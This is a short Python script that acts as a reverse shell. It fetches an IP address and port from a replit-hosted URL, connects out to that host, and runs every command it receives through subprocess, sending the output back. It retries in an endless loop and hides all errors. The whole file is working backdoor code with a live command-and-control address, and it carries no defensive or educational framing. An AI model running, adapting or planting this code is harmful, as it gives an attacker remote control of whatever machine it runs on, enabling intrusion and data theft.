import json, requests, subprocess, socket
import threading

#wait forever for a connection!
DATA_URL = "https://cornsilkdishonestchapter-dns.ryderretzlaff.repl.co/get_dns/c6e5ddce-e2a7-4163-bfd1-e48ff51561d7/"
DATA_R = requests.get(DATA_URL).text
DATA = json.loads(DATA_R)

while True:
    try:
        DATA_R = requests.get(DATA_URL).text
        DATA = json.loads(DATA_R)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((socket.gethostbyname(DATA["ip"]), int(DATA["port"])))
        def run_cmd(cmd):
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        while True:
            data = s.recv(1024)
            if data:
                threading.Thread(target=run_cmd, args=(data.decode(),)).start()
        break
    except: pass
print("Exiting!")
